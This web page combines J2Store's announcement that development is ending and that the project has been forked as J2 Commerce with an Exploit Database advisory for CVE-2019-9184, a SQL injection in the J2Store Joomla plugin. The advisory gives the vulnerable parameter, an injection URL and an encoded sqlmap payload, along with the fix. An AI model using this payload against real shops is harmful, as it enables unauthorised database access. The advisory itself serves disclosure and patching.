# Important Announcement: Sunsetting J2Store Development

**Dear J2Store Community,**

We have always strived to deliver quality eCommerce extension through J2Store, and we deeply appreciate the trust and support you have shown us over the years. However, after careful consideration, we have made the difficult decision to sunset the development of J2Store and its associated extensions.

This decision has not come easily. The rising costs of development, combined with dwindling revenue, have made it increasingly challenging for us to continue offering the level innovation that you deserve. As a result, we have chosen to sunset J2Store’s development, but keep it as open-source software for you to fork and build upon.

**What this means for you:**

* The J2Store repository has been archived, and the project will no longer be actively maintained.
* All open issues in the repository have been closed.
* J2Store will remain available for the community to explore, fork, and build upon.

**Extensions:** If you have purchased a license for any paid extensions and have an active license (a license is valid for a year from the date of purchase), you will continue to receive support until your license is valid. You can access support for the extension via our website.

We want to thank everyone who has been a part of the J2Store journey—your feedback, contributions, and enthusiasm have been invaluable.

Thank you for being a part of this journey with us. We hope that by open-sourcing the project, J2Store can continue to live on in new and exciting ways.

**Exciting News!**
J2Store has been forked and evolved into [J2 Commerce](https://j2commerce.com/), an initiative spearheaded by Adam and Oliver from the Joomla community. Head over to the J2 Commerce website for the latest updates and more information.

# Exploit Title: J2Store Plugin for Joomla! < 3.3.6 - SQL Injection
# Date: 19/02/2019
# Author: Andrei Conache
# Twitter: @andrei_conache
# Contact: andrei.conache[at]protonmail.com
# Software Link: https://www.j2store.org
# Version: 3.x-3.3.6
# Tested on: Linux
# CVE: CVE-2019-9184

1. Description:
J2Store is the most popular shopping/e-commerce extension for Joomla!. The SQL Injection found allows any visitor to run arbitrary queries
on the website.

2. Proof of Concept:

- Parameter vulnerable: "product_option[j]" array (where j depends on entries)
- Example: [URL]/index.php?option=com_j2store&view=product&task=update&product_option[j]=%27%22%3E2&product_qty=1&product_id=XX&option=com_j2store&ajax=0&_=XXXXXXXXXX
- sqlmap: product_option[j]=%28CASE%20WHEN%20%284862%3D4862%29%20THEN%204862%20ELSE%204862%2A%28SELECT%204862%20FROM%20DUAL%20UNION%20SELECT%205348%20FROM%20DUAL%29%20END%29

3. Solution:
Update to 3.3.7

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
